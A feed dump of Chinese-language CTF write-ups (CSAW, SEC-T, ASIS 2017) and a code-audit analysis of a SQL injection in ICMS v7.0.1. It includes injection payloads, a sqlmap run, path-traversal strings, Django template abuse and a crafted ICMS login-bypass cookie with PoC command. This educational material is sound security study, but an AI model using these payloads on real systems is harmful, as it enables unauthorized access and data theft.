      <title><![CDATA[CSAW CTF 2017-LittleQuery-writeup]]></title>
      <url>%2F2017%2F09%2F18%2FCSAW-CTF-2017-LittleQuery-writeup%2F</url>
      <content type="text"><![CDATA[CSAW CTF 2017-LittleQuery-writeupSQL注入漏洞 Task123LittleQueryI&apos;ve got a new website for BIG DATA analytics!http://littlequery.chal.csaw.io Solution先看看功能.有一个登陆点: http://littlequery.chal.csaw.io/login.php 有一些敏感目录：http://littlequery.chal.csaw.io/js/其中login.js:1234$(".form-signin").submit(function () &#123; var $password = $(this).find("input[type=password]"); $password.val(CryptoJS.SHA1($password.val()).toString());&#125;); query.js:123456789101112131415161718192021var codeMirror = CodeMirror.fromTextArea(document.getElementById('editor'), &#123; lineNumbers: true, matchBrackets: true, mode: 'javascript',&#125;);$('#submit').click(function() &#123; $('#submit').addClass('disabled'); $('#spinner').removeClass('invisible'); $('#output').text(''); $.post('/query.php', &#123; 'code': codeMirror.getValue(), &#125;, function (output) &#123; $('#output').text(output); $('#submit').removeClass('disabled'); $('#spinner').addClass('invisible'); &#125; );&#125;); 查看源代码，发现有注释： 同时由robots.txt，也能发现该页面： http://littlequery.chal.csaw.io/api/db_explore.php 若要preview ，会要求提供db和table参数。 所以先一步一步的“schema”。http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery&amp;table=user db和table都知道了，接着尝试一下preview： http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&amp;table=user 不能直接显示。考虑到这是数据库的操作，可能会存在sql注入漏洞。尝试访问：http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&#39;&amp;table=user‘ 可以看到单引号被加上了斜杠，同时知道是用反引号闭合的。根据上面两次操作，我们推测服务器后端大概是这样写的：12345678910111213141516&lt;?php ...$mode = $_GET['mode'];$db = isset($_GET['db'])? addslashes($_GET['db']):'';$table = isset($_GET['table'])? addslashes($_GET['table']):'';if ($mode == 'preview')&#123; if ($db &amp;&amp; $table)&#123; if ($db === 'littlequery') die("Database 'littlequery' is not allowed to be previewed."); $sql = "select * from `$db`.`$table`"; db-&gt;query($sql); &#125; else &#123; echo "Must provide db and table to preview data"; &#125;&#125;... 目的是要查出 littlequery.user 中的数据，所以利用反引号闭合，传入的db参数为：littlequery`.`user`%23。table参数随意，比如字母a。则传入后构造出来的sql语句为：1select * from `littlequery`.`user`%23`.`a` 则在%23后的将会被注释掉，同时又能过掉服务器端关于$db === &#39;littlequery&#39;的检测。1[&#123;&quot;uid&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;5896e92d38ee883cc09ad6f88df4934f6b074cf8&quot;&#125;] 回到 http://littlequery.chal.csaw.io/login.php ，直接登陆失败。看一下前面的login.js，会先把输入的密码进行一次CryptoJS.SHA1加密后再发送。而我们注出来的密码应该是原密码经过CryptoJS.SHA1加密后的结果，应该所以应该先抓包，修改password为”5896…” 出现了302跳转，follow：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSAW CTF 2017-Shia Labeouf-off-writeup]]></title>
      <url>%2F2017%2F09%2F18%2FCSAW-CTF-2017-Shia-Labeouf-off-writeup%2F</url>
      <content type="text"><![CDATA[CSAW CTF 2017-Shia Labeouf-off-writeupSSTI Django-debug根据wp复现。 Task12345678Do itJust do itDon&apos;t let your dreams be dreamsYesterday you said tomorrowSo just do itMake your dreams come trueJust do itPick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490 Solution用awvs扫了一下，发现Django的debug模式没有关闭 比如访问: http://web.chal.csaw.io:5487/polls/4/ ，给出的DEBUG页面里有很多重要的信息。 ./polls/views.py:123456789101112131415def index(request): latest_poll_list = Poll.objects.all().order_by('-pub_date')[:5] context = &#123;'latest_poll_list': latest_poll_list[1:3]&#125; return render(request, 'polls/index.html', context)def detail(request, poll_id): if int(poll_id) &gt; 3: return render(request, 'polls/detail.html', &#123;'poll': &#123;"id": int(poll_id), "question": "ahhhhh"&#125;&#125;) poll = get_object_or_404(Poll, pk=poll_id) return render(request, 'polls/detail.html', &#123;'poll': poll&#125;)def results(request, poll_id): poll = get_object_or_404(Poll, pk=poll_id) return render(request, 'polls/results.html', &#123;'poll': poll&#125;) ./polls/templatetags/pools_extras.py:123456789101112131415@register.filter(name='getme')def getme(value, arg): return getattr(value, arg)@register.filter(name='checknum')def checknum(value): check(value)@register.filter(name='listme')def listme(value): return dir(value)def check(value): if value &gt; 2: raise Exception("Our infrastructure can't support that many Shias!") 在 http://web.chal.csaw.io:5487/ad-lib/ 页面存在SSTI漏洞。由于Django的DEBUG模式开启，模板会存在内置的tab；\{\% debug \%\}： 它会输出页面的debug信息，包括当前的上下文和导入的模块。 对比前面的：1Where you want a noun, just put: &quot;&#123;&#123; noun &#125;&#125;&quot;, for a verb: &quot;&#123;&#123; verb &#125;&#125;&quot;, and for an adjective: &quot;&#123;&#123; adjective &#125;&#125;&quot;! 会注意到一个与众不同的变量/模块mrpoopy。 考虑到前面我们通过报错获取到的部分代码，在./polls/templatetags/pools_extras.py中，有这样一个过滤器：123@register.filter(name='listme')def listme(value): return dir(value) 当我们传入的变量为：mrpoopy | listme， 后端会调用dir(mrpoopy)并返回。 在./polls/templatetags/pools_extras.py，还有另外一个过滤器：123@register.filter(name='getme')def getme(value, arg): return getattr(value, arg) 当我们传入：\{\{mrpoopy|getme:&quot;__flag__&quot;\}\}， 经过过滤器，会调用getme(mrpoopy,&quot;__flag__&quot;)，也就是调用getattr(mrpoopy,&quot;__flag__&quot;)，从而返回mrpoopy的__flag__属性的值。 Refference Django:Built-in template tags and filters Django:自定义模板标签和过滤器 Django调试显示页面的所有变量]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSAW CTF 2017-Orange v1-writeup]]></title>
      <url>%2F2017%2F09%2F18%2FCSAW-CTF-2017-Orange-v1-writeup%2F</url>
      <content type="text"><![CDATA[CSAW CTF 2017-Orange v1-writeup文件读取漏洞 Task123I wrote a little proxy program in NodeJS for my poems folder.Everyone wants to read flag.txt but I like it too much to share.http://web.chal.csaw.io:7311/?path=orange.txt Solution若将path参数放空，即 http://web.chal.csaw.io:7311/?path= 没有flag.txt，所以需要想办法“遍历”一下目录。 尝试访问: http://web.chal.csaw.io:7311/?path=../ 考虑到可能有二次编码的问题，. =&gt; %2e =&gt; %252e，访问：http://web.chal.csaw.io:7311/?path=%252e%252e/ 最后访问: http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt 读取到一些源文件，如下： back.py：12345678910111213#!/usr/bin/pythonimport SimpleHTTPServerimport SocketServerPORT = 8080Handler = SimpleHTTPServer.SimpleHTTPRequestHandlerhttpd = SocketServer.TCPServer(("", PORT), Handler)print "Serving at port", PORThttpd.serve_forever() serve.sh:1234#!/usr/bin/env bashpython back.py &amp;nodejs server.js server.js:12345678910111213141516171819202122232425262728293031var http = require('http');var fs = require('fs');var url = require('url');var server = http.createServer(function(req, res) &#123; try &#123; var path = url.parse(req.url, true).query; path = path['path']; if (path.indexOf("..") == -1 &amp;&amp; path.indexOf("ＮＮ") == -1) &#123; var base = "http://localhost:8080/poems/"; var callback = function(response)&#123; var str = ''; response.on('data', function (chunk) &#123; str += chunk; &#125;); response.on('end', function () &#123; res.end(str); &#125;); &#125; http.get(base + path, callback).end(); &#125; else &#123; res.writeHead(403); res.end("WHOA THATS BANNED!!!!"); &#125; &#125; catch (e) &#123; res.writeHead(404); res.end('Oops'); &#125;&#125;);server.listen(9999);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[问鼎杯 CTF writeup]]></title>
      <url>%2F2017%2F09%2F16%2F%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup%2F</url>
      <content type="text"><![CDATA[问鼎杯 CTF writeup队伍：Ph0en1x 1.1http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999 得到flag：1WDFLAG=&#123;9c318582f7d864a9b4f9fcaab71657ce&#125; 1.2返回的页面头里有一个账号信息，用户名为：Voldemort，密码为：123456。 登陆后有个management。点击后跳转到：http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/admin.php查看源代码，有个js：http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/js/wdctffunction.js f12打开，控制台下getSecret(): flag:1wdctf&#123;rev3aled_j3_funct10ns&#125; 2.1后台地址： http://sec5.hdu.edu.cn/fuckme/login.php 社工后，用户名：847085251@qq.com ，密码：NB51A5 登陆后在未审核邮箱处找到： 访问：http://sec5.hdu.edu.cn/b7010bcfcdb62922d4e4a5ec8d79fb33.php跳转到：http://sec1.hdu.edu.cn/web/ww9ebmxnf1tlkn1d 得到flag：1WDFLAG=&#123;b3057d3283090fc160d999d272f20e44&#125; 3.1题目提供了一个 ++__++文件，在kali下自动显示为一个压缩包，提取后得到一个++__++文件，发现是pcap。用wireshark打开。通过自带的导出功能，得到三个文件。 但flag.rar被加密了无法直接解开。追踪一下tcp流，发现一个奇怪的字符串，直接用base64解是乱码。在它下面有一个py脚本。 经过一番调试，最后解密脚本修正如下：12345678910111213141516171819from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64IV = 'QWERTYUIOPASDFGH'def decrypt(encrypted): aes = AES.new(IV, AES.MODE_CBC, IV) return aes.decrypt(encrypted)def encrypt(message): length = 16 count = len(message) padding = length - (count % length) message = message + '\0' * padding aes = AES.new(IV, AES.MODE_CBC, IV) return aes.encrypt(message)print(decrypt(base64.b64decode("19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo="))) 运行后得到：passwd={No_One_Can_Decrypt_Me}。用于flag.rar的解密，得到最后的flag：1WDCTF&#123;Seclab_CTF_2017&#125; 3.2给了一张gif图片。https://ezgif.com/ 分解出四帧，然后ps将其拼接。得到： 扫描后得到：103f30d0ab8c1aa596300000000000000000200000040000000732e0000006400006401006c00005a00006402005a01006403005a02006404008400005a03006405008400005a040064010053280600000069ffffffff4e7403000000637466733d0000003138362c39382c3138302c3135342c3133392c3139322c3131342c31342c3130322c3136382c34332c3133362c35322c3231382c38352c3130302c3433630200000004000000070000004300000073610000007400006a01007c0100830100016401007d02007838007c0000445d30007d03007c02007402007403007c03008301007400006a04006402006403008302004183010064040017377d0200711a00577c02006a05006404008301007d02007c02005328050000004e7400000000690000000069ff00000074010000002c2806000000740600000072616e646f6d740400000073656564740300000073747274030000006f7264740700000072616e64696e7474050000007374726970280400000074040000007374723174030000006b65797404000000737472327401000000632800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e633107000000730c00000000010d0106010d012e010f016302000000040000000700000043000000735d0000007400006a01007c0100830100016401007d02007843007c00006a0200640200830100445d32007d03007403007c03008301007d03007c02007404007c03007400006a050064030064040083020041830100377d0200712300577c02005328050000004e52010000005202000000690000000069ff000000280600000052030000005204000000740500000073706c69747403000000696e74740300000063687252070000002804000000520b000000520a00000052090000007401000000692800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e63320f000000730c00000000010d01060116010c01240128050000005203000000520a000000740400000073747272520d000000521200000028000000002800000000280000000073100000002f686f6d652f6374662f6262622e707974080000003c6d6f64756c653e0100000073080000000c02060106030908 用hex编辑器保存为pyc文件，反汇编后得到py：1234567891011121314151617181920212223242526#!/usr/bin/env python# encoding: utf-8# 访问 http://tool.lu/pyc/ 查看更多信息import randomkey = 'ctf'strr = '186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43'def func1(str1, key): random.seed(key) str2 = '' for c in str1: str2 += str(ord(c) ^ random.randint(0, 255)) + ',' str2 = str2.strip(',') return str2def func2(str2, key): random.seed(key) str1 = '' for i in str2.split(','): i = int(i) str1 += chr(i ^ random.randint(0, 255)) return str1 最后一行添上：print(func2(strr,key)) 得到flag：1U_r_Greatt! 4.1给了一张图片，用binwalk -e分解后得到day2’s secret.zip和tips.txt。 tips.txt的内容如下：1Although two days doing the same things, but day2 has a secret than day1 考虑盲水印。 提交：1My_c4t_Ho 4-2古典密码，然后放到 quipqiup.com 解一下 得到flag。 5-1用xortool测试一下；1234567891011121314151617root@chybeta:~/Desktop# xortool cipher -c 20The most probable key lengths: 2: 12.2% 5: 11.9% 9: 9.8% 13: 22.2% 20: 6.8% 22: 6.2% 26: 12.8% 30: 4.6% 39: 7.8% 52: 5.7%Key-length can be 3*n1 possible key(s) of length 13:Good\tuckToYouFound 1 plaintexts with 95.0%+ printable charactersSee files filename-key.csv, filename-char_used-perc_printable.csv 猜测key为 GoodLuckToYou，写出脚本如下：123456789101112131415161718import random# from secret import FLAGkey = "GoodLuckToYou"text = open("cipher","rb").read()def xor_str(x, y): if len(x) &gt; len(y): return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x[:len(y)], y)]) else: return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x, y[:len(x)])])# flag, key = FLAG.encode('hex'), KEY.encode('hex')enc = xor_str(key * (len(text) // len(key) + 1), text)ef = open('flag.txt', 'w')ef.write(enc)ef.close() 得到flag：1wdflag&#123;You Are Very Smart&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SEC-T CTF2017-Naughty ads-writeup]]></title>
      <url>%2F2017%2F09%2F14%2FSEC-T-CTF2017-Naughty-ads-writeup%2F</url>
      <content type="text"><![CDATA[SEC-T CTF2017-Naughty ads-writeupsql注入 Task1234Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;Solves: 40Service: http://naughtyads.alieni.se/Author: avlidienbrunn Solution扫描器扫到robots.txt ，访问：http://naughtyads.alieni.se/robots.txt 有一个admin，但访问需要输入账号和密码。 尝试访问： http://naughtyads.alieni.se/index.phps 。得到源代码如下：123456789101112131415161718192021222324252627282930313233343536&lt;?phprequire_once 'lib.php';header('X-XSS-Protection: 0');$cols = array( "e8c4-437b-9476", "849e-416e-acf7", "7f9d-470f-8698", "c8bb-4695-93f7", "5fbc-4729-8821", "3ad3-46c3-b975", "f44f-4cc9-a5e0", "0c3f-42c8-a0ae" );if(isset($_REQUEST['id']))&#123; if(preg_match("/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i", $_REQUEST['id']))&#123; die("Attack detected!!!"); &#125; $ad = get_ad($_GET['id']); ?&gt; &lt;HTML&gt; &lt;HEAD&gt; &lt;TITLE&gt;NAUGHTY ADS ©1994&lt;/TITLE&gt; &lt;/HEAD&gt; &lt;BODY BGCOLOR="WHITE"&gt; &lt;CENTER&gt; &lt;?php echo $ad['description'] ?&gt;&lt;br /&gt; &lt;a href="/"&gt;Home&lt;/a&gt; &lt;/CENTER&gt; &lt;/BODY&gt; &lt;/HTML&gt; &lt;?php die;&#125;?&gt; 对于 $_REQUEST[‘id’] ，进行了“严格”的正则匹配，不能正常的注出数据。接下来通过 $_GET[‘id’] 将其带入数据库中查询并返回结果给页面。 这里考察了一个知识。$_REQUEST变量默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。在 php.ini 配置文件中，有一个参数variables_order 其中几个字母（EGPCS）对应如下： Environment, Get, Post, Cookie, Server。这些字母的出现顺序，表明了数据的加载顺序。从三种默认配置来看，相对顺序均是GP，也就是说只要有POST参数进来，那么它就会覆盖同名的GET参数。如下图； 所以就本题而言，如果在GET参数id处注入数据（比如 union select），而同时我们又通过POST方法传入一个id参数，那么服务器检测的是无害的POST数据，而在进行查询时带入的是有害的GET数据。 将如下数据包保存为test.txt，用sqlmap跑：12345678910111213POST /?id=* HTTP/1.1Host: naughtyads.alieni.seUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 18id= 0c3f-42c8-a0ae 命令：1python sqlmap.py -r test.txt -D naughty --dump 得到账号密码，登陆 http://naughtyads.alieni.se/admin/ 在Phone number处填上555-31338，提交后得到flag：1SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125; 其实那个正则，是有问题的。。。很容易绕过的啦。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SEC-T CTF2017-Sprinkler system-writeup]]></title>
      <url>%2F2017%2F09%2F14%2FSEC-T-CTF2017-Sprinkler-system-writeup%2F</url>
      <content type="text"><![CDATA[SEC-T CTF2017-Sprinkler system-writeuptest-cgi利用 Task12345Solves: 102Service: http://sprinklers.alieni.se/Author: avlidienbrunn Solution发现有robots.txr。访问：http://sprinklers.alieni.se/robots.txt 接着访问 http://sprinklers.alieni.se/cgi-bin/test-cgi 是 test-cgi ， 可以遍历目录。访问 http://sprinklers.alieni.se/cgi-bin/test-cgi?* 最后访问：http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system 得到flag：1SECT&#123;-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ICMSv7.0.1 admincp.class.php sql注入分析]]></title>
      <url>%2F2017%2F09%2F12%2FICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[ICMSv7.0.1 admincp.class.php sql注入分析代码审计学习中下载地址：ICMSv7.0.1 漏洞分析出现漏洞的地方在 app\admincp\admincp.class.php 的init函数1234567891011121314151617181920212223242526public static function init() &#123; self::check_seccode(); //验证码验证 iUI::$dialog['title'] = iPHP_APP; iDB::$show_errors = true; iDB::$show_trace = false; iDB::$show_explain = false; members::$LOGIN_PAGE = ACP_PATH.'/template/admincp.login.php'; members::$GATEWAY = iPHP::PG('gateway'); members::check_login(); //用户登陆验证 members::check_priv('ADMINCP','page');//检查是否有后台权限 files::init(array('userid'=&gt; members::$userid)); //菜单 menu::init(); menu::$callback = array( "priv" =&gt; array("members","check_priv"), "hkey" =&gt; members::$userid ); admincp::$callback = array( "history" =&gt; array("menu","history"), "priv" =&gt; array("members","check_priv") ); &#125; 在用户登陆验证，调用members::check_login()，跟进，其代码如下：12345678910111213141516171819202122232425262728public static function check_login() &#123;// self::$LOGIN_COUNT = (int)authcode(get_cookie('iCMS_LOGIN_COUNT'),'DECODE');// if(self::$LOGIN_COUNT&gt;iCMS_LOGIN_COUNT) exit(); $a = iSecurity::escapeStr($_POST['username']); $p = iSecurity::escapeStr($_POST['password']); $ip = iPHP::get_ip(); $sep = iPHP_AUTH_IP?'#=iCMS['.$ip.']=#':'#=iCMS=#'; if(empty($a) &amp;&amp; empty($p)) &#123; $auth = iPHP::get_cookie(self::$AUTH); list($a,$p) = explode($sep,authcode($auth,'DECODE')); $c = self::check($a,$p); &#125;else &#123; $p = md5($p); $c = self::check($a,$p); if ($c)&#123; iDB::query(" UPDATE `#iCMS@__members` SET `lastip`='".$ip."', `lastlogintime`='".time()."', `logintimes`=logintimes+1 WHERE `uid`='".self::$userid."' "); iPHP::set_cookie(self::$AUTH,authcode($a.$sep.$p,'ENCODE')); &#125; &#125; return self::result($c); &#125; $a和$p分别是用户名和密码，会先经过escapeStr的过滤，若不为空且通过了self::check($a,$p)的检查即可登陆成功。若为空，则会从cookie里获取值，并通过list($a,$p) = explode($sep,authcode($auth,&#39;DECODE&#39;));获取到用户名和密码，并进行检查self::check($a,$p)。 self::check()的部分代码：1234567public static function check($a,$p) &#123; if(empty($a) &amp;&amp; empty($p)) &#123; return false; &#125; self::$data = iDB::row("SELECT * FROM `#iCMS@__members` WHERE `username`='&#123;$a&#125;' AND `password`='&#123;$p&#125;' AND `status`='1' LIMIT 1;");... 通常情况下，要从登陆口进行注入，传入的参数会进行escapeStr()的过滤，而escapeStr()是比较严格的：12345678910111213public static function escapeStr($string) &#123; if(is_array($string)) &#123; foreach($string as $key =&gt; $val) &#123; $string[$key] = iSecurity::escapeStr($val); &#125; &#125; else &#123; $string = str_replace(array('%00','\\0',"\0","\x0B"), '', $string); //modified@2010-7-5 $string = str_replace(array('&amp;', '"',"'", '&lt;', '&gt;'), array('&amp;amp;', '&amp;quot;','&amp;#039;', '&amp;lt;', '&amp;gt;'), $string); $string = preg_replace('/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;)|[a-zA-Z][a-z0-9]&#123;2,5&#125;);)/', '&amp;\\1',$string); $string = str_replace('\\\\', '&amp;#92;', $string); &#125; return $string;&#125; 对单双引号都做了过滤，因此若是直接注入，会闭合失败。 考虑从cookie获取参数的路径，即下面这段代码：12345if(empty($a) &amp;&amp; empty($p)) &#123; $auth = iPHP::get_cookie(self::$AUTH); list($a,$p) = explode($sep,authcode($auth,'DECODE')); $c = self::check($a,$p);&#125; 从cookie中恢复的$a和$p没有再进行检查。所以假设我们能构造一个cookie，使得从explode恢复出来的$a和$p包含引号能够闭合，那就能引发sql注入了。 假设username为&#39; or 1=1%23，password为随意，则期望的sql注入语句为:1SELECT * FROM `#iCMS@__members` WHERE `username`=&apos;&apos; or 1=1#&apos; AND `password`=&apos;1&apos; AND `status`=&apos;1&apos; LIMIT 生成的对应的cookie即为:14a62f154%2B9j%2BoQdL3%2BsaUTFDkMvY6WSLPzfJIFgd%2FBLE1ghVDuX4WQjoLW7es0tR60E 可以看到已经登陆成功。 cmsPoc里提供了python版本的poc，对应命令如下：1python cmspoc.py -t icms -s v701_sqlinject_getadmin -u http://10.10.10.1:2500/iCMS-7.0.1/admincp.php 修补方案官方在 v7.0.2中修复了该漏洞，在members::check_login()函数中，当从cookie中获取到$a,$p后先进行了一次addslashes，之后才进行查询。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ASISCTF2017-Simple Crypto-writeup]]></title>
      <url>%2F2017%2F09%2F12%2FASISCTF2017-Simple-Crypto-writeup%2F</url>
      <content type="text"><![CDATA[ASISCTF2017-Simple Crypto-writeup简单异或加密 Task1234Begining always needs an interesting challenge, we can assure you, this challenge is an interesting one to begin the CTF!Challange Updated, please redownload the binary file!https://asisctf.com/tasks/simple_crypto_e5189fe3d3d64de3d612de266315a9e96dc43787 Solution下载下来后解压得到两个文件flag.enc和simple.py。flag.enc是加密后的文件，simple.py是加密算法的实现，其代码如下：12345678910111213141516171819#!/usr/bin/pythonimport randomfrom secret import FLAGKEY = 'musZTXmxV58UdwiKt8Tp'def xor_str(x, y): if len(x) &gt; len(y): return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x[:len(y)], y)]) else: return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x, y[:len(x)])])flag, key = FLAG.encode('hex'), KEY.encode('hex')enc = xor_str(key * (len(flag) // len(key) + 1), flag).encode('hex')ef = open('flag.enc', 'w')ef.write(enc.decode('hex'))ef.close() 流程如下； 将FLAG,KEY进行hex编码得到flag，key 经过xor_str()处理，将flag，key的每一位对应进行异或操作，返回最后的结果后进行一次hex编码，得到enc 将enc进行hex解码后写入到文件flag.enc中 由于只是进行简单的异或操作，所以解密系统可以归纳如下： 从flag.enc中读取，并进行hex编码，得到enc 把KEY进行hex编码，得到key 将key和enc进行xor_str()处理，并进行一次hex编码，得到flag 将flag进行hex解码，得到FLAG 据此写出解密脚本:1234567891011121314151617def xor_str(x, y): if len(x) &gt; len(y): return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x[:len(y)], y)]) else: return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x, y[:len(x)])])ef = open('flag.enc', 'rb')flag = ef.read()KEY = 'musZTXmxV58UdwiKt8Tp'key = KEY.encode('hex')dec = xor_str(key * (len(flag) // len(key) + 1), flag).encode('hex')df = open("decflag",'wb')df.write(dec.decode('hex'))df.close() 得到的decflag里的一长串字符用hex编辑器处理一下 得到flag：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ASISCTF2017-ASIS secret letter-writeup]]></title>
      <url>%2F2017%2F09%2F11%2FASISCTF2017-ASIS-secret-letter-writeup%2F</url>
      <content type="text"><![CDATA[ASISCTF2017-ASIS secret letter-writeupbinwalk Stéganô Task1The face is the index of the mind, its ASIS secret letter! Solution题目提供了压缩包，解压后得到两张图片。用binwalk看一下。1234567891011121314151617181920212223root@chybeta:~/Desktop/asis_letter# binwalk *Scan Time: 2017-09-06 07:51:11Target File: /root/Desktop/asis_letter/3baa358f6d671e86f17bc4439cc4062eMD5 Checksum: 3baa358f6d671e86f17bc4439cc4062eSignatures: 344DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compressionScan Time: 2017-09-06 07:51:11Target File: /root/Desktop/asis_letter/e07d17ed7d8104590ff3e17bdf052057MD5 Checksum: e07d17ed7d8104590ff3e17bdf052057Signatures: 344DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 4351 x 2812, 8-bit/color RGB, non-interlaced41 0x29 Zlib compressed data, default compression 用命令binwalk -e *解压出文件，在图片3baa358f6d671e86f17bc4439cc4062e解压得到的文件夹中：12345root@chybeta:~/Desktop/asis_letter# cd _3baa358f6d671e86f17bc4439cc4062e.extracted/root@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# ls38 38.zlibroot@chybeta:~/Desktop/asis_letter/_3baa358f6d671e86f17bc4439cc4062e.extracted# cat 38OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r 将上面的base64串进行解密，得到：123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode("OEorU2pDQWdabkp2YlNCQlUwbFRJSGRwZEdnZ2JHOTJaU3dnY0d4bFlYTmxJR1pwYm1RZ2MyVmpjbVYwSUcxbGMzTmhaMlVnWVc1a0lISmxjR3g1SUhOdmIyNHNJSEJ2ZDJWeVpXUWdZbmtnOEorUmlTQWdVM1REcVdkaGJzTzBJUENma1lnPQ==r")'8J+SjCAgZnJvbSBBU0lTIHdpdGggbG92ZSwgcGxlYXNlIGZpbmQgc2VjcmV0IG1lc3NhZ2UgYW5kIHJlcGx5IHNvb24sIHBvd2VyZWQgYnkg8J+RiSAgU3TDqWdhbsO0IPCfkYg=' 继续进行base64解密： 得到提示：Stéganô 。 在github上搜索，发现了一个项目：cedricbonhomme/Stegano 经过尝试，最后的命令如下：1stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057 -g triangular_numbers flag:1ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125; 或者用python12345&gt;&gt;&gt; from stegano import lsbset&gt;&gt;&gt; from stegano.lsbset import generators&gt;&gt;&gt; message = lsbset.reveal("./e07d17ed7d8104590ff3e17bdf052057", generators.triangular_numbers())&gt;&gt;&gt; message'ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;']]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ASISCTF2017-GSA File Server-writeup]]></title>
      <url>%2F2017%2F09%2F11%2FASISCTF2017-GSA-File-Server-writeup%2F</url>
      <content type="text"><![CDATA[ASISCTF2017-GSA File Server-writeupdocx-xxe漏洞 Task123GSA&apos;s file server, go find the hole, drill it and grab the flag :)Note that Scope is 128.199.40.185:*Alert: No remote brute force and automated scanning are needed. Solution查看源代码，发现有 functionds.js123456789101112$( document ).ready(function()&#123; $("#files").click(function()&#123; $.get('/showFiles', function(data)&#123; var myArray = $.parseJSON(data); for(var i=0; i&lt;myArray.length; i++) &#123; console.log(myArray[i]) $("#results").append('&lt;a href="files/'+myArray[i]+'"&gt;&lt;img src="/images/file-icon.png" width="50" height="50" alt="" border="0"/&gt;&lt;/a&gt;'); &#125; &#125;) &#125;)&#125;); 当在页面上的图片（它id为files）点击时，它会向 http://128.199.40.185/showFiles 发送GET请求，并将返回的结果加到页面中。点击后即可下载文件，下载链接为 http://128.199.40.185/files/demo.docx 点击页面的图片(id为files)，用burp抓包，查看返回头部； 在Response包中，多了Directory: .，消息主体为[&quot;demo.docx&quot;]，看上去是指当前目录（即 ./ ）下有一个文件名为demo.docx。尝试指定Directory字段为..，这样表示上一级目录（即 ../ ）： 不过翻来翻去，好像莫啥用。题目给的网址是 128.199.40.185:* ，注意端口并没有指定，用nmap扫扫：1nmap -T4 -A -v 128.199.40.185 扫描结果大致如下：1234567891011121314Nmap scan report for 128.199.40.185Host is up (0.20s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION22/tcp open ssh (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open http Apache httpd 2.4.25 ((Ubuntu))|_http-methods: No Allow or Public header in OPTIONS response (status code 200)|_http-title: GSA File Server139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WEB-01)445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WEB-01)8081/tcp open http Apache httpd 2.4.25 ((Ubuntu))|_http-methods: No Allow or Public header in OPTIONS response (status code 200)|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8). 除了80端口外，8081端口也运行着web服务，访问：http://128.199.40.185:8081/ 没啥信息。结合前面利用burp探测得到的目录结构，我们访问：http://128.199.40.185:8081/panelManager-0.1/ 。有一个上传功能： 